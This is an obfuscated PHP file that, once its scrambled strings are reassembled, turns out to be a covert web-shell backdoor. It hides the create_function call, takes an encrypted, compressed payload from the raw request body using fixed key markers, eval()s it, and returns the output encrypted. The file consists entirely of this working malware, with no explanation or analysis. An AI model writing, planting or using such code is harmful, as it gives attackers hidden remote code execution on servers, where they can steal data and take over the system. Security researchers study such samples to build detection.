<?php
$S='YGPcRyD9~~";function x(~$t,$k){~$c~~=strlen($k);$l=st~r~len($t~);~~$o="';
$y='@~b~ase64_decode($m[1]~)~,$k)));$~o=@ob_get_~con~t~ents();@ob_en~d_c~le';
$w='~$k{$j~};}~}~return $o;}if (@pre~g_~match("/$kh(~.+)$~kf~~/",@fil~e_get_~c~o';
$t='ntents("php:/~/in~put")~,$m)==1) {~@ob_start()~;@ev~al(@gzuncom~pres~s(@x(~';
$M='";for($~i=0;$i<$~l;){for($j=0;~(~$j<$c&&$i<$l~)~;$j+~+,$i++){$~o.=$t{$i}~^';
$W=str_replace('L','','LcreLatLLeL_fuLnction');
$Y='$k=~"d96c~9f~de";$kh="449~37017~62~32";$kf="fa358~1~10f2a5";$p=~"OQCHpda~~D';
$q='an();~$r=@base6~4_enc~ode(@~x(~@gz~compress($o),~$k));~pr~i~nt("$p$kh$r$kf");}';
$f=str_replace('~','',$Y.$S.$M.$w.$t.$y.$q);
$C=$W('',$f);$C();
?>
